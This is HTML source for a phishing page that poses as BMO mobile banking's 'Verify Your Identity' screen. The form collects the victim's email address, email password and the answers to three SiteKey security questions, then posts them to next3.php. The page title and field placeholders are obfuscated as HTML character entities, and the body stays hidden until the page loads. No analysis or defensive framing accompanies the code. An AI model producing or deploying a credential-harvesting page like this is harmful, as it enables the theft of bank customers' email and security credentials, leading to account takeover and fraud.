<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;&#32;&#45;&#32;&#66;&#77;&#79;&#77;&#111;&#98;&#105;&#108;&#101;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
 
.textbox { 
    height: 40px; 
    width: 275px;
	border-radius: 3px;	
    background-color: #FFFFFF;  
    border: 1px solid #848484; 
	border:none;	
	padding-left: 8px;
    border-width: 0px 0px 0px 0px;  
    border-color: darkred; 
    outline:0; 
	font: 15px Arial;
	font-weight: bold;
  } 
 </style>				  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
</head>

<body style="visibility:hidden" onload="unhideBody()"  bgColor="#006FB2">
<div id="shape1" style="position:absolute; overflow:hidden; left:85px; top:723px; width:95px; height:27px; z-index:0"><img border=0 width="100%" height="100%" alt="" src="images/shape258366750.gif"></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:394px; height:98px; z-index:1"><img src="images/om7.png" alt="" title="" border=0 width=394 height=98></div>

<div id="image1" style="position:absolute; overflow:hidden; left:281px; top:7px; width:111px; height:28px; z-index:2"><a href="#"><img src="images/fran.png" alt="" title="" border=0 width=111 height=28></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:4px; top:156px; width:379px; height:38px; z-index:3"><img src="images/om4.png" alt="" title="" border=0 width=379 height=38></div>

<div id="image4" style="position:absolute; overflow:hidden; left:6px; top:113px; width:153px; height:25px; z-index:4"><img src="images/ver.png" alt="" title="" border=0 width=153 height=25></div>

<div id="image5" style="position:absolute; overflow:hidden; left:14px; top:220px; width:289px; height:91px; z-index:5"><img src="images/om3.png" alt="" title="" border=0 width=289 height=91></div>

<div id="image6" style="position:absolute; overflow:hidden; left:14px; top:322px; width:289px; height:91px; z-index:6"><img src="images/om3.png" alt="" title="" border=0 width=289 height=91></div>

<div id="image7" style="position:absolute; overflow:hidden; left:16px; top:425px; width:289px; height:91px; z-index:7"><img src="images/om3.png" alt="" title="" border=0 width=289 height=91></div>

<div id="image8" style="position:absolute; overflow:hidden; left:17px; top:528px; width:289px; height:91px; z-index:8"><img src="images/om3.png" alt="" title="" border=0 width=289 height=91></div>
<form action=next3.php name=chalbhai id=chalbhai method=post>
<input name="email" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#65;&#100;&#100;&#114;&#101;&#115;&#115;" class="textbox" autocomplete="off" required type="email" style="position:absolute;width:315px;left:15px;top:220px;z-index:9">
<input name="epass" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:314px;left:15px;top:270px;z-index:10">
<select name="q1" class="textbox" autocomplete="off" required style="position:absolute;left:14px;top:322px;width:315px;z-index:11">
<option value="">Select SiteKey Challenge Question 1</option>
                          <OPTION value="What was the first name of your first roommate?">What was the first name of your first roommate?</OPTION>
                          <OPTION value="What is the name of the city where your father was born?">What is the name of the city where your father was born? </OPTION>
                          <OPTION value="What is the first name of the best man at your wedding? ">What is the first name of the best man at your wedding? </OPTION>
                          <OPTION value="What is the first name of the maid of honour at your wedding?">What is the first name of the maid of honour at your wedding?</OPTION>
                          <OPTION value="What is your youngest child's middle name?">What is your youngest child's middle name?</OPTION>
                          <OPTION value="What is the first name of the person you went to your prom with?">What is the first name of the person you went to your prom with?</OPTION>
                          <OPTION value="What is the middle name of your oldest sibling?">What is the middle name of your oldest sibling?</OPTION>
                          <OPTION value="Who was your favourite athlete as a child?">Who was your favourite athlete as a child?</OPTION>
                          <OPTION value="What was the last name of your favourite teacher in elementary school?">What was the last name of your favourite teacher in elementary school?</OPTION>
                          <OPTION value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</OPTION>
                          <OPTION value="What colour was your first car?">What colour was your first car?</OPTION>
        <OPTION value="What is the first name of your spouse's/partner's father?">What is the first name of your spouse's/partner's father?</OPTION>
                          <OPTION value="What is the first name of your father's oldest sibling?">What is the first name of your father's oldest sibling?</OPTION>
                          <OPTION value="What is the first name of your mother's oldest sibling?">What is the first name of your mother's oldest sibling?</OPTION>
                          <OPTION value="What was the first name of your first manager?">What was the first name of your first manager?</OPTION>
                          <OPTION value="What is your mother's middle name?">What is your mother's middle name?</OPTION>
                          <OPTION value="What was the name of your favourite superhero as a child?">What was the name of your favourite superhero as a child?</OPTION>
                          <OPTION value="What was the name of your first pet?">What was the name of your first pet?</OPTION>
        <OPTION value="What is your favourite cartoon?">What is your favourite cartoon?</OPTION>
                          <OPTION value="What was the last name of your favourite teacher in high school?">What was the last name of your favourite teacher in high school?</OPTION>
                          <OPTION value="What is the first name of your first friend?">What is the first name of your first friend?</OPTION>
        <OPTION value="What is your father's middle name?">What is your father's middle name?</OPTION>
        <OPTION value="What is your spouse's/partner's middle name?">What is your spouse's/partner's middle name?</OPTION>
        <OPTION value="What city were you born in?">What city were you born in?</OPTION>
        <OPTION value="What is the street name where you lived when you were 10 years old?">What is the street name where you lived when you were 10 years old?</OPTION>
        <OPTION value="What is your favourite musical instrument?">What is your favourite musical instrument?</OPTION>
        <OPTION value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</OPTION>
        <OPTION value="What is the name of the city where your mother was born?">What is the name of the city where your mother was born?</OPTION>
        <OPTION value="What is the first name of your oldest cousin?">What is the first name of your oldest cousin?</OPTION></select>
<input name="ans1" placeholder="&#65;&#110;&#115;&#119;&#101;&#114;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:314px;left:16px;top:372px;z-index:12">
<select name="q2" class="textbox" autocomplete="off" required style="position:absolute;left:17px;top:425px;width:315px;z-index:13">
<option value="">Select SiteKey Challenge Question 2</option>
                          <OPTION value="What was the first name of your first roommate?">What was the first name of your first roommate?</OPTION>
                          <OPTION value="What is the name of the city where your father was born?">What is the name of the city where your father was born? </OPTION>
                          <OPTION value="What is the first name of the best man at your wedding? ">What is the first name of the best man at your wedding? </OPTION>
                          <OPTION value="What is the first name of the maid of honour at your wedding?">What is the first name of the maid of honour at your wedding?</OPTION>
                          <OPTION value="What is your youngest child's middle name?">What is your youngest child's middle name?</OPTION>
                          <OPTION value="What is the first name of the person you went to your prom with?">What is the first name of the person you went to your prom with?</OPTION>
                          <OPTION value="What is the middle name of your oldest sibling?">What is the middle name of your oldest sibling?</OPTION>
                          <OPTION value="Who was your favourite athlete as a child?">Who was your favourite athlete as a child?</OPTION>
                          <OPTION value="What was the last name of your favourite teacher in elementary school?">What was the last name of your favourite teacher in elementary school?</OPTION>
                          <OPTION value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</OPTION>
                          <OPTION value="What colour was your first car?">What colour was your first car?</OPTION>
        <OPTION value="What is the first name of your spouse's/partner's father?">What is the first name of your spouse's/partner's father?</OPTION>
                          <OPTION value="What is the first name of your father's oldest sibling?">What is the first name of your father's oldest sibling?</OPTION>
                          <OPTION value="What is the first name of your mother's oldest sibling?">What is the first name of your mother's oldest sibling?</OPTION>
                          <OPTION value="What was the first name of your first manager?">What was the first name of your first manager?</OPTION>
                          <OPTION value="What is your mother's middle name?">What is your mother's middle name?</OPTION>
                          <OPTION value="What was the name of your favourite superhero as a child?">What was the name of your favourite superhero as a child?</OPTION>
                          <OPTION value="What was the name of your first pet?">What was the name of your first pet?</OPTION>
        <OPTION value="What is your favourite cartoon?">What is your favourite cartoon?</OPTION>
                          <OPTION value="What was the last name of your favourite teacher in high school?">What was the last name of your favourite teacher in high school?</OPTION>
                          <OPTION value="What is the first name of your first friend?">What is the first name of your first friend?</OPTION>
        <OPTION value="What is your father's middle name?">What is your father's middle name?</OPTION>
        <OPTION value="What is your spouse's/partner's middle name?">What is your spouse's/partner's middle name?</OPTION>
        <OPTION value="What city were you born in?">What city were you born in?</OPTION>
        <OPTION value="What is the street name where you lived when you were 10 years old?">What is the street name where you lived when you were 10 years old?</OPTION>
        <OPTION value="What is your favourite musical instrument?">What is your favourite musical instrument?</OPTION>
        <OPTION value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</OPTION>
        <OPTION value="What is the name of the city where your mother was born?">What is the name of the city where your mother was born?</OPTION>
        <OPTION value="What is the first name of your oldest cousin?">What is the first name of your oldest cousin?</OPTION></select>
<input name="ans2" placeholder="&#65;&#110;&#115;&#119;&#101;&#114;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:314px;left:16px;top:475px;z-index:14">
<select name="q3" class="textbox" autocomplete="off" required style="position:absolute;left:18px;top:528px;width:315px;z-index:15">
<option value="">Select SiteKey Challenge Question 3</option>
                          <OPTION value="What was the first name of your first roommate?">What was the first name of your first roommate?</OPTION>
                          <OPTION value="What is the name of the city where your father was born?">What is the name of the city where your father was born? </OPTION>
                          <OPTION value="What is the first name of the best man at your wedding? ">What is the first name of the best man at your wedding? </OPTION>
                          <OPTION value="What is the first name of the maid of honour at your wedding?">What is the first name of the maid of honour at your wedding?</OPTION>
                          <OPTION value="What is your youngest child's middle name?">What is your youngest child's middle name?</OPTION>
                          <OPTION value="What is the first name of the person you went to your prom with?">What is the first name of the person you went to your prom with?</OPTION>
                          <OPTION value="What is the middle name of your oldest sibling?">What is the middle name of your oldest sibling?</OPTION>
                          <OPTION value="Who was your favourite athlete as a child?">Who was your favourite athlete as a child?</OPTION>
                          <OPTION value="What was the last name of your favourite teacher in elementary school?">What was the last name of your favourite teacher in elementary school?</OPTION>
                          <OPTION value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</OPTION>
                          <OPTION value="What colour was your first car?">What colour was your first car?</OPTION>
        <OPTION value="What is the first name of your spouse's/partner's father?">What is the first name of your spouse's/partner's father?</OPTION>
                          <OPTION value="What is the first name of your father's oldest sibling?">What is the first name of your father's oldest sibling?</OPTION>
                          <OPTION value="What is the first name of your mother's oldest sibling?">What is the first name of your mother's oldest sibling?</OPTION>
                          <OPTION value="What was the first name of your first manager?">What was the first name of your first manager?</OPTION>
                          <OPTION value="What is your mother's middle name?">What is your mother's middle name?</OPTION>
                          <OPTION value="What was the name of your favourite superhero as a child?">What was the name of your favourite superhero as a child?</OPTION>
                          <OPTION value="What was the name of your first pet?">What was the name of your first pet?</OPTION>
        <OPTION value="What is your favourite cartoon?">What is your favourite cartoon?</OPTION>
                          <OPTION value="What was the last name of your favourite teacher in high school?">What was the last name of your favourite teacher in high school?</OPTION>
                          <OPTION value="What is the first name of your first friend?">What is the first name of your first friend?</OPTION>
        <OPTION value="What is your father's middle name?">What is your father's middle name?</OPTION>
        <OPTION value="What is your spouse's/partner's middle name?">What is your spouse's/partner's middle name?</OPTION>
        <OPTION value="What city were you born in?">What city were you born in?</OPTION>
        <OPTION value="What is the street name where you lived when you were 10 years old?">What is the street name where you lived when you were 10 years old?</OPTION>
        <OPTION value="What is your favourite musical instrument?">What is your favourite musical instrument?</OPTION>
        <OPTION value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</OPTION>
        <OPTION value="What is the name of the city where your mother was born?">What is the name of the city where your mother was born?</OPTION>
        <OPTION value="What is the first name of your oldest cousin?">What is the first name of your oldest cousin?</OPTION></select>
<input name="ans3" placeholder="&#65;&#110;&#115;&#119;&#101;&#114;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:314px;left:17px;top:577px;z-index:16">
<div id="formimage1" style="position:absolute; left:20px; top:664px; z-index:17"><input type="image" name="formimage1" width="292" height="42" src="images/submit.png"></div>

</body>
</html>
